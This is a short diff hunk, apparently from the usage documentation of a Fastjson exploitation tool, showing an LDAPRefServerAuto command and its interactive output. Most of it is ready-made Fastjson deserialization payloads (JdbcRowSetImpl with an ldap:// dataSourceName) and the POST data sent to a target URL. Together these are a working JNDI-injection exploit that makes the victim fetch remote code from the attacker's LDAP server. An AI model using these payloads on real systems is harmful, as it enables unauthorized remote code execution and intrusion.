@@ -38,13 +38,13 @@ Content-Length: 165
 __PAYLOAD__
 
 
-> java -cp fastjson_tool.jar fastjson.LDAPRefServerAuto 127.0.0.1 8088 req
+> java -cp fastjson_tool.jar fastjson.LDAPRefServerAuto 127.0.0.1 8088 file=req
 
 [-] target: https://xx.xx.xx.xx/fastjson_demo
 [-] Payload list:
 0. {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:8088/Object","autoCommit":true}
 1. {"e":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:8088/Object","autoCommit":true}}
-[-] please chosse payload, enter q or quit to quit
+[-] [-] please chosse payload, or input payload like payload={......}
 > 1
 [-] url: https://xx.xx.xx.xx/fastjson_demo
 [-] post_data: {"e":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:8088/Object","autoCommit":true}}
